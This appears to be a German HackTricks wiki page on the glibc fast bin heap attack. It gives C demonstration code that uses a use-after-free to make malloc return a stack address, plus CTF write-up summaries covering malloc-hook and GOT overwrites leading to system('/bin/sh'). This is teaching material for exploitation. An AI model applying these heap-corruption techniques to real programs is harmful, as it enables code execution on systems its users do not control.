# Schneller Bin-Angriff

{% hint style="success" %}
Lernen und √ºben Sie AWS-Hacking: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen und √ºben Sie GCP-Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
{% endhint %}

## Grundlegende Informationen

F√ºr weitere Informationen dar√ºber, was ein schneller Bin ist, √ºberpr√ºfen Sie diese Seite:

{% content-ref url="bins-and-memory-allocations.md" %}
[bins-and-memory-allocations.md](bins-and-memory-allocations.md)
{% endcontent-ref %}

Da der schnelle Bin eine einfach verkettete Liste ist, gibt es viel weniger Schutzma√ünahmen als in anderen Bins und es reicht aus, **eine Adresse in einem freigegebenen schnellen Bin**-Chunk zu **√§ndern**, um sp√§ter einen Chunk in einer beliebigen Speicheradresse **zu allozieren**.

Zusammenfassend:

{% code overflow="wrap" %}
```c
ptr0 = malloc(0x20);
ptr1 = malloc(0x20);

// Put them in fast bin (suppose tcache is full)
free(ptr0)
free(ptr1)

// Use-after-free
// Modify the address where the free chunk of ptr1 is pointing
*ptr1 = (unsigned long)((char *)&<address>);

ptr2 = malloc(0x20); // This will get ptr1
ptr3 = malloc(0x20); // This will get a chunk in the <address> which could be abuse to overwrite arbitrary content inside of it
```
{% endcode %}

Sie k√∂nnen ein vollst√§ndiges Beispiel in einem sehr gut erkl√§rten Code unter [https://guyinatuxedo.github.io/28-fastbin\_attack/explanation\_fastbinAttack/index.html](https://guyinatuxedo.github.io/28-fastbin\_attack/explanation\_fastbinAttack/index.html) finden:
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(void)
{
puts("Today we will be discussing a fastbin attack.");
puts("There are 10 fastbins, which act as linked lists (they're separated by size).");
puts("When a chunk is freed within a certain size range, it is added to one of the fastbin linked lists.");
puts("Then when a chunk is allocated of a similar size, it grabs chunks from the corresponding fastbin (if there are chunks in it).");
puts("(think sizes 0x10-0x60 for fastbins, but that can change depending on some settings)");
puts("\nThis attack will essentially attack the fastbin by using a bug to edit the linked list to point to a fake chunk we want to allocate.");
puts("Pointers in this linked list are allocated when we allocate a chunk of the size that corresponds to the fastbin.");
puts("So we will just allocate chunks from the fastbin after we edit a pointer to point to our fake chunk, to get malloc to return a pointer to our fake chunk.\n");
puts("So the tl;dr objective of a fastbin attack is to allocate a chunk to a memory region of our choosing.\n");

puts("Let's start, we will allocate three chunks of size 0x30\n");
unsigned long *ptr0, *ptr1, *ptr2;

ptr0 = malloc(0x30);
ptr1 = malloc(0x30);
ptr2 = malloc(0x30);

printf("Chunk 0: %p\n", ptr0);
printf("Chunk 1: %p\n", ptr1);
printf("Chunk 2: %p\n\n", ptr2);


printf("Next we will make an integer variable on the stack. Our goal will be to allocate a chunk to this variable (because why not).\n");

int stackVar = 0x55;

printf("Integer: %x\t @: %p\n\n", stackVar, &stackVar);

printf("Proceeding that I'm going to write just some data to the three heap chunks\n");

char *data0 = "00000000";
char *data1 = "11111111";
char *data2 = "22222222";

memcpy(ptr0, data0, 0x8);
memcpy(ptr1, data1, 0x8);
memcpy(ptr2, data2, 0x8);

printf("We can see the data that is held in these chunks. This data will get overwritten when they get added to the fastbin.\n");

printf("Chunk 0: %s\n", (char *)ptr0);
printf("Chunk 1: %s\n", (char *)ptr1);
printf("Chunk 2: %s\n\n", (char *)ptr2);

printf("Next we are going to free all three pointers. This will add all of them to the fastbin linked list. We can see that they hold pointers to chunks that will be allocated.\n");

free(ptr0);
free(ptr1);
free(ptr2);

printf("Chunk0 @ 0x%p\t contains: %lx\n", ptr0, *ptr0);
printf("Chunk1 @ 0x%p\t contains: %lx\n", ptr1, *ptr1);
printf("Chunk2 @ 0x%p\t contains: %lx\n\n", ptr2, *ptr2);

printf("So we can see that the top two entries in the fastbin (the last two chunks we freed) contains pointers to the next chunk in the fastbin. The last chunk in there contains `0x0` as the next pointer to indicate the end of the linked list.\n\n");


printf("Now we will edit a freed chunk (specifically the second chunk \"Chunk 1\"). We will be doing it with a use after free, since after we freed it we didn't get rid of the pointer.\n");
printf("We will edit it so the next pointer points to the address of the stack integer variable we talked about earlier. This way when we allocate this chunk, it will put our fake chunk (which points to the stack integer) on top of the free list.\n\n");

*ptr1 = (unsigned long)((char *)&stackVar);

printf("We can see it's new value of Chunk1 @ %p\t hold: 0x%lx\n\n", ptr1, *ptr1);


printf("Now we will allocate three new chunks. The first one will pretty much be a normal chunk. The second one is the chunk which the next pointer we overwrote with the pointer to the stack variable.\n");
printf("When we allocate that chunk, our fake chunk will be at the top of the fastbin. Then we can just allocate one more chunk from that fastbin to get malloc to return a pointer to the stack variable.\n\n");

unsigned long *ptr3, *ptr4, *ptr5;

ptr3 = malloc(0x30);
ptr4 = malloc(0x30);
ptr5 = malloc(0x30);

printf("Chunk 3: %p\n", ptr3);
printf("Chunk 4: %p\n", ptr4);
printf("Chunk 5: %p\t Contains: 0x%x\n", ptr5, (int)*ptr5);

printf("\n\nJust like that, we executed a fastbin attack to allocate an address to a stack variable using malloc!\n");
}
```
{% hint style="danger" %}
Wenn es m√∂glich ist, den Wert der globalen Variablen **`global_max_fast`** mit einer gro√üen Zahl zu √ºberschreiben, erm√∂glicht dies das Generieren von Fast Bin Chunks mit gr√∂√üeren Gr√∂√üen, was potenziell erm√∂glicht, Fast Bin Attacks in Szenarien durchzuf√ºhren, in denen dies zuvor nicht m√∂glich war. Diese Situation ist n√ºtzlich im Kontext des [large bin attack](large-bin-attack.md) und [unsorted bin attack](unsorted-bin-attack.md).
{% endhint %}

## Beispiele

* **CTF** [**https://guyinatuxedo.github.io/28-fastbin\_attack/0ctf\_babyheap/index.html**](https://guyinatuxedo.github.io/28-fastbin\_attack/0ctf\_babyheap/index.html)**:**
* Es ist m√∂glich, Chunks zuzuweisen, sie freizugeben, ihren Inhalt zu lesen und sie zu f√ºllen (mit einer √úberlaufschwachstelle).
* **Konsolidierung von Chunks f√ºr Infoleak**: Die Technik besteht im Wesentlichen darin, den √úberlauf zu missbrauchen, um eine gef√§lschte `prev_size` zu erstellen, sodass ein vorheriger Chunk in einen gr√∂√üeren Chunk gelegt wird. Wenn dann der gr√∂√üere Chunk allokiert wird, der einen anderen Chunk enth√§lt, ist es m√∂glich, dessen Daten zu drucken und eine Adresse an libc zu leaken (`main_arena+88`).
* **√úberschreiben des malloc-Hooks**: Durch Ausnutzen der vorherigen √úberlappungssituation war es m√∂glich, 2 Chunks zu haben, die auf denselben Speicher zeigten. Daher war es m√∂glich, beide freizugeben (wobei ein anderer Chunk dazwischen freigegeben wurde, um Schutzmechanismen zu umgehen). Es war dann m√∂glich, denselben Chunk zweimal im Fast Bin zu haben. Anschlie√üend war es m√∂glich, ihn erneut zuzuweisen, die Adresse zum n√§chsten Chunk zu √ºberschreiben, um ein wenig vor `__malloc_hook` zu zeigen (damit es auf eine Ganzzahl zeigt, die malloc f√ºr eine freie Gr√∂√üe h√§lt - ein weiterer Umgehungsweg), ihn erneut zuzuweisen und dann einen anderen Chunk zuzuweisen, der eine Adresse zu malloc-Hooks erhalten wird. Schlie√ülich wurde ein **one gadget** dort geschrieben.
* **CTF** [**https://guyinatuxedo.github.io/28-fastbin\_attack/csaw17\_auir/index.html**](https://guyinatuxedo.github.io/28-fastbin\_attack/csaw17\_auir/index.html)**:**
* Es gibt einen Heap-√úberlauf und eine Verwendung nach Freigabe sowie eine doppelte Freigabe, da beim Freigeben eines Chunks die Zeiger wiederverwendet und erneut freigegeben werden k√∂nnen.
* **Libc-Infoleak**: Einfach einige Chunks freigeben, und sie erhalten einen Zeiger auf einen Teil des Speicherbereichs der Hauptarena. Da freigegebene Zeiger wiederverwendet werden k√∂nnen, kann diese Adresse einfach gelesen werden.
* **Fast Bin Attack**: Alle Zeiger auf die Allokationen werden in einem Array gespeichert, sodass wir ein paar Fast Bin Chunks freigeben und im letzten den Zeiger √ºberschreiben k√∂nnen, um ein wenig vor dieses Array von Zeigern zu zeigen. Anschlie√üend k√∂nnen ein paar Chunks mit derselben Gr√∂√üe allokiert werden, wobei wir zuerst den legitimen und dann den gef√§lschten erhalten, der das Array von Zeigern enth√§lt. Wir k√∂nnen nun diese Allokationszeiger √ºberschreiben, um die GOT-Adresse von `free` auf `system` zu setzen und dann `"/bin/sh"` in Chunk 1 zu schreiben, um dann `free(chunk1)` aufzurufen, was stattdessen `system("/bin/sh")` ausf√ºhrt.
* **CTF** [**https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw19\_traveller/index.html**](https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw19\_traveller/index.html)
* Ein weiteres Beispiel f√ºr den Missbrauch eines ein Byte √úberlaufs, um Chunks im unsortierten Bin zu konsolidieren und ein libc-Infoleak zu erhalten und dann einen Fast Bin Attack durchzuf√ºhren, um den malloc-Hook mit einer One-Gadget-Adresse zu √ºberschreiben.
* **CTF** [**https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw18\_alienVSsamurai/index.html**](https://guyinatuxedo.github.io/33-custom\_misc\_heap/csaw18\_alienVSsamurai/index.html)
* Nach einem Infoleak durch den Missbrauch des unsortierten Bins mit einem UAF, um eine libc-Adresse und eine PIE-Adresse zu leaken, verwendete das Exploit dieses CTF einen Fast Bin Attack, um einen Chunk an einem Ort zu allozieren, an dem die Zeiger auf kontrollierte Chunks lagen, sodass es m√∂glich war, bestimmte Zeiger zu √ºberschreiben, um ein One-Gadget in der GOT zu schreiben.
* Sie k√∂nnen einen Fast Bin Attack missbraucht durch einen unsortierten Bin Attack finden:
* Beachten Sie, dass es √ºblich ist, bevor Fast Bin Attacks durchgef√ºhrt werden, die Freelisten zu missbrauchen, um libc/Heap-Adressen zu leaken (wenn n√∂tig).
* [**Robot Factory. BlackHat MEA CTF 2022**](https://7rocky.github.io/en/ctf/other/blackhat-ctf/robot-factory/)
* Wir k√∂nnen nur Chunks der Gr√∂√üe gr√∂√üer als `0x100` allozieren.
* √úberschreiben Sie `global_max_fast` mit einem Unsorted Bin Attack (funktioniert 1/16 Mal aufgrund von ASLR, da wir 12 Bits √§ndern m√ºssen, aber 16 Bits √§ndern m√ºssen).
* Fast Bin Attack, um ein globales Array von Chunks zu √§ndern. Dies erm√∂glicht ein beliebiges Lese-/Schreib-Primitive, mit dem die GOT ge√§ndert und eine Funktion so eingestellt werden kann, dass sie auf `system` zeigt.

{% content-ref url="unsorted-bin-attack.md" %}
[unsorted-bin-attack.md](unsorted-bin-attack.md)
{% endcontent-ref %}

{% hint style="success" %}
Lernen Sie & √ºben Sie AWS-Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen Sie & √ºben Sie GCP-Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterst√ºtzen Sie HackTricks</summary>

* √úberpr√ºfen Sie die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories einreichen.

</details>
{% endhint %}
